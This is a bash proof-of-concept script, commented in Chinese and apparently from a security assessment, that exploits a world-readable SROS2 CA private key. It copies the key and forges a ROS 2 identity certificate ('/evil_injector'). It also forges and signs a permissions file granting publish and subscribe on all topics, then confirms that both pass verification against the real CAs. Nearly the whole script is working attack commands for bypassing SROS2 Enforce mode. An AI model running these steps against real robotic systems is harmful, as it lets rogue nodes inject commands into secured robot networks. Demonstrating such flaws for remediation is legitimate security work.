#!/usr/bin/env bash
# 攻擊 N26 — SROS2 信任根淪陷：世界可讀的 CA 私鑰 → 偽造任意身分 + 任意權限
#
# 前提漏洞（實測）：
#   /home/jesse/ros2_security_keystore/private/ca.key.pem 權限 644（世界可讀）
#   且 identity_ca.key.pem 與 permissions_ca.key.pem 都 symlink 到同一把 ca.key.pem
#   → 同主機任何非特權使用者/容器/行程都能讀到 CA 私鑰。
#
# 本 PoC 證明（純離線 openssl，零 DDS 流量、絕不碰 domain 30）：
#   偷到這把 CA 私鑰後，攻擊者可
#     (1) 偽造一張全新身分憑證（任意 CN），通過真 identity_ca 的鏈驗證
#     (2) 偽造一份「publish 全部 topic」的 permissions.xml，用同一把 CA 簽 S/MIME，
#         通過真 permissions_ca 的驗章
#   → 取得一個 SROS2 眼中「完全合法、完全授權」的 enclave → Enforce 模式整個被繞過。
#
# 安全聲明：只「讀」真實 keystore 的 public cert + private key（示範可讀性），
#   所有偽造產物寫在 /tmp/sros2_attack，不修改真 keystore、不啟動任何 ROS 節點。
set -u
K=/home/jesse/ros2_security_keystore
W=/tmp/sros2_attack
rm -rf "$W"; mkdir -p "$W"; cd "$W" || exit 1

echo "=================================================================="
echo " N26  SROS2 CA 私鑰竊取 → 身分/權限偽造 PoC"
echo "=================================================================="

echo "[*] 步驟0：示範 CA 私鑰可被非特權讀取"
ls -l "$K/private/ca.key.pem"
cp "$K/private/ca.key.pem"            stolen_ca.key.pem       # ← 攻擊者「偷」走
cp "$K/public/identity_ca.cert.pem"  real_identity_ca.cert.pem
cp "$K/public/permissions_ca.cert.pem" real_perm_ca.cert.pem 2>/dev/null || \
  cp "$K/public/identity_ca.cert.pem" real_perm_ca.cert.pem
echo "    → 已複製 CA 私鑰到 $W/stolen_ca.key.pem"

echo
echo "[*] 步驟1：用偷來的 CA 私鑰偽造一張全新身分憑證 CN=/evil_injector"
# DDS 身分 CN 帶前導斜線，openssl -subj 會把 / 當欄位分隔 → 改用 config 指定
printf '[req]\ndistinguished_name=dn\nprompt=no\n[dn]\nCN=/evil_injector\n' > evil.cnf
openssl ecparam -name prime256v1 -genkey -noout -out evil.key.pem 2>/dev/null
openssl req -new -key evil.key.pem -out evil.csr -config evil.cnf 2>/dev/null
openssl x509 -req -in evil.csr \
  -CA real_identity_ca.cert.pem -CAkey stolen_ca.key.pem -CAcreateserial \
  -days 3650 -out evil_identity.cert.pem 2>/dev/null
echo "    偽造憑證 subject/issuer："
openssl x509 -in evil_identity.cert.pem -noout -subject -issuer

echo
echo "[*] 步驟2：拿真 identity_ca 憑證去驗證這張偽造憑證的信任鏈"
if openssl verify -CAfile real_identity_ca.cert.pem evil_identity.cert.pem ; then
  echo "    ✅ 攻擊成功：偽造身分通過真 CA 鏈驗證（SROS2 會把 /evil_injector 當合法節點）"
else
  echo "    ❌ 驗證失敗（CA 私鑰無效或鏈不符）"
fi

echo
echo "[*] 步驟3：偽造一份『publish 所有 topic』的 permissions.xml"
cat > evil_permissions.xml <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<dds xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:noNamespaceSchemaLocation="http://www.omg.org/spec/DDS-SECURITY/20170901/omg_shared_ca_permissions.xsd">
  <permissions>
    <grant name="/evil_injector">
      <subject_name>CN=/evil_injector</subject_name>
      <validity><not_before>2026-01-01T00:00:00</not_before><not_after>2037-01-01T00:00:00</not_after></validity>
      <allow_rule>
        <domains><id>30</id></domains>
        <publish><topics><topic>*</topic></topics></publish>
        <subscribe><topics><topic>*</topic></topics></subscribe>
      </allow_rule>
      <default>DENY</default>
    </grant>
  </permissions>
</dds>
XML

echo "[*] 步驟4：用同一把偷來的 CA 私鑰對 evil_permissions.xml 做 S/MIME 簽章"
openssl smime -sign -in evil_permissions.xml -text \
  -signer real_perm_ca.cert.pem -inkey stolen_ca.key.pem \
  -outform SMIME -nodetach -out evil_permissions.p7s 2>/dev/null
echo "    → 產生 evil_permissions.p7s"

echo
echo "[*] 步驟5：拿真 permissions_ca 憑證去驗證偽造的 permissions 簽章"
if openssl smime -verify -in evil_permissions.p7s -inform SMIME \
     -CAfile real_perm_ca.cert.pem -out /dev/null 2>/tmp/sros2_attack/verify.err ; then
  echo "    ✅ 攻擊成功：偽造『publish *』權限通過真 permissions_ca 驗章"
else
  echo "    ❌ 驗證失敗：$(cat /tmp/sros2_attack/verify.err)"
fi

echo
echo "=================================================================="
echo " 結論：CA 私鑰一旦可讀，攻擊者可同時偽造『身分』與『授權』，"
echo "       取得 SROS2 眼中完全合法 + 完全授權的 enclave。"
echo "       → SROS2 Enforce（你文件中 raw-topic 攻擊的根治解）被連根拔起。"
echo "=================================================================="
